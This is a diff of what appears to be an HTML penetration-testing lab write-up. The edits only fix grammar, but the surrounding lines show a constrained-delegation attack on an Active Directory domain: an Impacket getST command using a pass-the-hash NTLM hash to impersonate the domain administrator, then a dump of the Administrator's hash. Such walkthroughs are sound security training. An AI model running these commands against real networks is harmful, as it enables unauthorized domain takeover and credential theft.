@@ -1492,7 +1492,7 @@ P@ssw0rd@21
 <p><img alt="" src="../osint_into_da.assets/image-20211226124606191.png" /></p>
 <p>By abusing constrained delegation privileges we can impersonate the Domain Admin to authenticate on the <strong>DC01</strong>, but first we have to know which service <strong>SQLSVC</strong> is allowed to delegate. This can be done either from <a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1">Powerview</a>'s <code>Get-NetUser</code> or from BloodHound.  </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226142625225.png" /></p>
-<p>So the service account <strong>SQLSVC</strong> are allowed the serivce <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p>
+<p>So the account <strong>SQLSVC</strong> are allowed to delegate to the service <code>WWW/DC01</code>, we will use this service to impersonate the Domain Admin. Impacket contains a great tool called <code>getST</code> that can request a ticket. </p>
 <div class="highlight"><pre><span></span><code>proxychains impacket-getST  -impersonate administrator -spn WWW/dc01.xtech.local xtech.local/SQLSVC -hashes :5e76ca700abd3597ab702c0b52bacad2 -dc-ip <span class="m">10</span>.10.10.12 
 Impacket v0.9.23.dev1+20210315.121412.a16198c3 - Copyright <span class="m">2020</span> SecureAuth Corporation
 
@@ -1514,7 +1514,7 @@ Impacket v0.9.24 - Copyright <span class="m">2021</span> SecureAuth Corporation
 xtech.local<span class="se">\A</span>dministrator:500:aad3b435b51404eeaad3b435b51404ee:f7b8c850b103fd71e2d60fbe19d1e373:::
 <span class="o">[</span>*<span class="o">]</span> Cleaning up... 
 </code></pre></div>
-<p>The attack works, we have impersonate the Domain Admin and dump it is NTLM hash now we have access into the xtech network. </p>
+<p>The attack works, we have impersonated the Domain Admin and dump it is NTLM hash now we have access into the xtech network. </p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226141754470.png" /></p>
 <p>We can execute commands as Domain Admin.</p>
 <p><img alt="" src="../osint_into_da.assets/image-20211226141954753.png" /></p>
